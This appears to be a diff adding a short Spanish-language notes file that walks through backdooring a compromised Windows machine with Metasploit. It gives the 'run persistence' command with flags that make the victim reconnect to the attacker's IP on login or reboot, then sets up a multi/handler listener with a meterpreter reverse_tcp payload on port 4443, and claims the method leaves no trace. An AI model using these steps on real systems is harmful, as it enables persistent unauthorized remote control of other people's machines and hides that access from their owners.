@@ -1,0 +1,31 @@
+1) Utilizamos metasploit para realizar el ataque y crear una puerta trase sobre la maquina victima. Para posteriormente conectarnos
+    desde dicha puerta a la maquina victima.
+    
+2) Buscamos el exploit para atacar una vulnerabilidad
+3) Una ved que tenemos la sesion abierta con la maquina victima
+
+4) A partir de una herramienta llamada "en metasploit" PERSISTENCE
+    *run persistence -U -X -i 60 -p 4443 -r nuestra_ip
+        -U = Comando persistence que conecte con el atacante cuando la victima inicie sesion 
+        -X = Conecte cuando la victima inicie o reinicio
+        -i = Cada cuantos segundos queremos que se conecte 
+        -p = Mediante que puerto
+        -r = IP del atacante 
+
+ 5) Una ved conseguido lo anterior buscamos un exploit llamado multi/handler, que es un exploit de escucha:
+
+    *search multi/handler 
+    *use exploit/multi/handler 
+
+ 6) Dentro de multi/handler utilizamos el payload que nos creo PERSISTENCE
+
+    *set payload windows/meterpreter/reverse_tcp
+    # Configuramos el LHOST (nosotros)
+    *set lhost nuestra_ip 
+    # Y ponemos el puerto seleccionado anteriormente
+    *set lport 4443
+    # Lanzamos exploit 
+    *exploit 
+
+ 7) De esta forma no dejamos rastro ya que no aparece el puerto abierto.+
+ 
